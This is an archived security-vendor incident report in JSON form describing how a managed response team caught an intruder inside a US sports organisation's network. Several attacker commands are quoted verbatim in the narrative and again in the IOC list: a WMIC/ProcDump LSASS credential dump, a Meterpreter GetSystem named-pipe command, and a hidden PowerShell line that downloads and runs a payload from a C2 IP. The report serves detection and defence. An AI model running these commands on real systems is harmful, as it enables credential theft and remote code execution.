{
    "id": "387ecbf7-d73f-4c21-a65e-3d5a1e32afca",
    "created_at": "2023-01-12T15:06:04.571894Z",
    "updated_at": "2025-03-27T02:09:18.13192Z",
    "deleted_at": null,
    "sha1_hash": "19373bf13f99c534ec978d64bb78607fa88611d4",
    "title": "2020-10-27 - MTR Casebook- An active adversary caught in the act",
    "authors": "",
    "file_creation_date": "2022-05-28T02:51:14Z",
    "file_modification_date": "2022-05-28T02:51:14Z",
    "file_size": 646811,
    "plain_text": "# MTR Casebook: An active adversary caught in the act\n\n**[news.sophos.com/en-us/2020/10/27/mtr-casebook-an-active-adversary-caught-in-the-act/](https://news.sophos.com/en-us/2020/10/27/mtr-casebook-an-active-adversary-caught-in-the-act/)**\n\nGreg Iddon October 27, 2020\n\n_Customer profile: A professional sports organization based in the USA, with approximately 800 devices._\n\nThe Sophos Managed Threat Response (MTR) team provides 24/7 threat hunting, detection, and response\ncapabilities delivered by an expert team as a fully-managed service.\n\n## The initial clue: A needle among the hay\n\nIn the hunt for suspicious events, the Sophos MTR team analyzes tens of millions of data points each day by\nleveraging threat intelligence, machine learning, and complex rule sets derived from the front-line experience that\noperators have gained from responding to threats day in, day out.\n\nThis analysis is done with the goal of finding signals that could potentially be an indicator of an attack. You can learn\n[more about our Threat Detection and Response methodology in this blog post.](https://news.sophos.com/en-us/2020/09/03/a-real-world-guide-to-threat-detection-and-response-part-1/)\n\nIn this case, the signal was of a legitimate Microsoft’s Sysinternals tool. ProcDump.exe – a tool typically used by\ndevelopers to analyze running software processes and to write (or ‘dump’) their memory to disk so that it can be\ninspected. Developers find this tool very handy for figuring out why a bug is occurring.\n\nYet in this instance, ProcDump was attempting to export the memory space of lsass.exe. This raised alarm bells with\nthe Sophos MTR operations team which monitors the customer environment 24/7.\n\nLSASS is the Local Security Authority Subsystem Service in Microsoft Windows and it is responsible for enforcing\nsecurity policy and handling logins to Windows systems. If one were to write its memory to disk, the usernames and\npasswords of users could be retrieved from it.\n\nThe Sophos MTR team had indeed spotted an indicator of attack. Someone was trying to steal credentials.\n\n\n-----\n\nYou may have heard of Mimikatz, a tool whose sole purpose is for stealing passwords, hashes, security tokens, and\nso on. Adversaries sometimes avoid using this tool given its widespread detection by security products. But unlike\nMimikatz, ProcDump has legitimate uses beyond just the nefarious, and thus is rarely detected by security vendors.\n\nSomeone was trying to not get caught.\n\n## The investigation begins\n\nA case was created the same minute as the signal was generated, and a Sophos MTR operator immediately began\nto investigate.\n\n### Attempted credential theft\n\nThe operator looked into the historic data gathered by our agent and found the process that caused the detection.\nThe process was trying to invoke a command:\n```\n   C:\\Windows\\system32\\cmd.exe /C wmic /node:\"SERVER NAME\" process call create\n  \"C:\\PerfLogs\\procdump.exe -accepteula -ma lsass C:\\PerfLogs\\lsass.dmp\"\n\n```\nThe command shows the Windows command-line interpreter cmd.exe attempting to use WMIC – the interface for\nWindows Management Instrumentation. WMI is a tool for interacting with local and remote systems to get\ninformation and send them instructions.\n\nCalling out to a remote server (redacted to SERVER NAME), the command was trying to tell the server to run\nProcDump and write the LSASS process’ memory to disk.\n\nThankfully the MTR operator found no evidence that “lsass.dmp” was written to disk, and a review of their Sophos\nCentral telemetry showed Sophos credential theft prevention technology successfully thwarted the adversary’s\nattempt.\n\nBut where did this command come from?\n\n### Attempted privilege escalation\n\nThe operator looked back up the process tree to find the parent of (i.e. what started) cmd.exe and found svchost.exe\n– the Windows Service Host that is used to run single processes and conserve computing resources.\n\nThe same instance of svchost also spawned another child process:\n\n```\nC:\\Windows\\system32\\cmd.exe /c echo 4d6b1c047b2 > \\\\.\\pipe\\8eaee7\n\n```\n\nTo the untrained eye, the above command doesn’t appear obviously malicious. Yet this is a common artifact that can\nbe observed from the GetSystem function of Meterpreter.\n\nThe Meterpreter is a payload that gives an adversary interactive command-line access to a host and GetSystem is a\nscript built into the Meterpreter that aids an adversary in gaining full system privileges by impersonating a named\npipe – a technology to enable processes to communicate with one another.\n\nThankfully the named pipe they were trying to exploit didn’t exist on the system at that time.\n\n### Command and control\n\nWith the knowledge that the adversary was using the Meterpreter, this would indicate they must have some kind of\nnetwork connection to remotely send their commands to the compromised host.\n\nDigging into the network logs, the MTR operator could see a large number of outbound connections to Bulgarian IP\naddress 217.12.202.89 using the network port 443.\n\n\n-----\n\nPort 443 is typically used by HTTPS for securely connecting to websites, and adversaries commonly use this port to\nhide themselves among legitimate web traffic.\n\nThis discovery initiated a review of this Bulgarian-based IP. One of the ports it had open to the internet is port 50050.\nThis port is an ephemeral port – one that cannot be registered with IANA and thus is not a common port used by\nwell-known network services. However, the MTR operator had seen this port many times before.\n\nPort 50050 is the default listening port for a Cobalt Strike listening server. Cobalt Strike is a “threat emulation” tool\ntypically marketed to penetration testers to easily facilitate adversarial attacks and help organizations see their risk to\nbreaches.\n\nHowever, malicious threat actors have gotten their hands on this tool and use it orchestrate real attacks on innocent\nvictims.\n\n## Notifying the customer\n\nOnly minutes after the initial detection was made, the MTR operator completed the initial investigation and had high\nconfidence that this was malicious adversarial activity.\n\nSophos MTR offers three modes of response to customers that they can switch between at any time:\n\n**Notify –Sophos conducts threat identification and investigation, informing the customer of the findings and offering**\nthe customer recommendations for how to respond to the threat themselves.\n\n**Collaborate – Sophos conducts threat identification and investigation, and collaborates on the response to the**\nthreat, dividing responsibility between the customer and the Sophos MTR team.\n\n**Authorize – Sophos conducts threat identification, investigation, and response and takes proactive action, informing**\nthe customer about what was detected and the response actions that were taken.\n\nIn this instance, the MTR customer was in Notify mode. The operator reached out to the customer via phone to\ndiscuss the discovery and to provide recommendations for how to respond to the immediate findings before the\ninvestigation continued.\n\nThe MTR operator shared the discoveries and the user accounts leveraged by the adversary. These accounts\nneeded their passwords reset immediately to disable the adversary’s access. In addition to the phone call, all the\ndetails were provided in an email to be referenced while the customer took action.\n\n## Continuing the hunt\n\nWith the customer working on resetting the compromised accounts’ passwords, the MTR operator continued to\nfollow the adversary’s journey across the customer’s network. At this point, no evidence had been found as to how\nthey got inside.\n\nNote that throughout the rest of this case, regular communication between the MTR operator and the customer took\nplace via email.\n\n### Lurking in the cloud\n\nDeeper analysis of the network traffic on the compromised host showed HTTPS traffic between the host and another\nthat resided in the customer’s virtual private cloud (VPC), where they have a number of servers that face the public\ninternet.\n\nDiving into the logs of the server in the VPC, the MTR operator quickly spotted further GetSystem attempts and\nnamed pipe impersonation. However, all evidence pointed towards the already identified compromised hosts.\n\n\n-----\n\nAdditionally, a PowerShell (a scripting language built into Windows for use with task automation) command\nexecution was identified:\n```\n   \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new  object net.webclient).downloadstring('http://217.12.202.89:80/axdfcvgfdfgyhnhgvcdfvghjh'))\"\n\n```\nThis one-line command reaches out to a URL and downloads and executes a payload it finds there. The URL points\nto the same Bulgarian IP where the MTR team found the open ports for Cobalt Strike.\n\n### SophosLabs\n\nThe MTR operator quickly reached out to SophosLabs, Sophos’ threat analysis, intelligence, and research division.\nSharing the above command, the MTR operator asked for assistance with analyzing the payload hosted at that URL.\nWithin a few minutes, SophosLabs shared their insights back with Sophos MTR.\n\nUnfortunately, the payload in question was no longer present: seemingly taken down by the adversary shortly after\nthey used it. SophosLabs promptly added the IP and the URL to the cloud intelligence platform that underpins all\nSophos products and services so that any further use of that command and control server will be detected and\nblocked across all Sophos customers.\n\n## Finding the initial access\n\nFinally, the MTR operator identified where the attack began. Continuing the analysis of the VPC server’s logs,\nRemote Desktop Protocol (RDP) communication to an unknown host was spotted within the VPC. This unknown\nhost was not under management by Sophos MTR, nor could it be found in the customer’s Sophos Central account.\n\nThe operator reached out to the customer to ask what this unknown host was and why it wasn’t under management.\n\nIt seems they decommissioned it too late. The adversary had laterally moved from the original compromised host to\nanother and executed the PowerShell command. This gave them remote access to a new host in the event they lost\ntheir access via RDP.\n\nThis turned out to be a smart move by the adversary, as this is exactly what happened.\n\nRDP servers far too often face the public internet,making them a prime target of adversaries looking to break into\nnetworks. Once inside, RDP is a noisy and visual method of having remote access. Moving cursors on the screen\nare somewhat of a giveaway.\n\nThe first thing an adversary will look to do is to move laterally, to another host, and install a reverse shell – a way to\nhave that host call back to them and give them command line access. Using the command line is a far more stealthy\nmethod of remote access, allowing them to hide in the background even while a user is logged in and using the host.\n\nAs to what the adversary’s goals were, these are unknown. The MTR operators identified the attacker long before\nthey were able to action on their objectives, catching them while they were still in the network propagation stages,\nlaterally moving and attempting to escalate their privileges.\n\nFollowing the investigation, the MTR operators continued to monitor the customer’s estate for this specific threat for\nseven more days, identifying no further malicious or suspicious activity.\n\nThe MTR team then concluded that the adversary had been successfully ejected from the network.\n\nCase closed. On to the next.\n\n## Learn more\n\n[For more information on the Sophos MTR service, visit our website or](https://www.sophos.com/en-us/products/managed-threat-response.aspx) [speak with a Sophos representative.](https://secure2.sophos.com/en-us/products/managed-threat-response/contact-request.aspx)\n\n\n-----\n\nIf you prefer to conduct your own threat hunts, [Sophos EDR gives you the tools you need for advanced threat](https://www.sophos.com/en-us/products/endpoint-antivirus/edr.aspx)\n[hunting and IT security operations hygiene. Start a 30-day no obligation trial today.](https://secure2.sophos.com/en-us/products/endpoint-antivirus/free-trial.aspx)\n\n## IOAs / IOCs\n\nProcDump of LSASS C:\\Windows\\system32\\cmd.exe /C wmic /node:”SERVER NAME” process call create\n“C:\\PerfLogs\\procdump.exe -accepteula -ma lsass C:\\PerfLogs\\lsass.dmp”\n\nMeterpreter GetSystem C:\\Windows\\system32\\cmd.exe /c echo 4d6b1c047b2 > \\\\.\\pipe\\8eaee7\n\nC2 IPv4 217.12.202.89\n\nC2 payload URL http://217.12.202.89:80/axdfcvgfdfgyhnhgvcdfvghjh\n\nC2 port (Cobalt Strike) 50050\n\n\nPowerShell\nto download\nand invoke Cobalt\nStrike payload\n\n\n“C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe” -nop -w hidden -c “IEX\n((newobject net.webclient).downloadstring(‘http://217.12.202.89:80/axdfcvgfdfgyhnhgvcdfvghjh’))”\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-27 - MTR Casebook- An active adversary caught in the act.pdf"
    ],
    "report_names": [
        "2020-10-27 - MTR Casebook- An active adversary caught in the act.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535964,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653706274,
    "ts_modification_date": 1653706274,
    "files": {
        "pdf": "https://archive.orkl.eu/19373bf13f99c534ec978d64bb78607fa88611d4.pdf",
        "text": "https://archive.orkl.eu/19373bf13f99c534ec978d64bb78607fa88611d4.txt",
        "img": "https://archive.orkl.eu/19373bf13f99c534ec978d64bb78607fa88611d4.jpg"
    }
}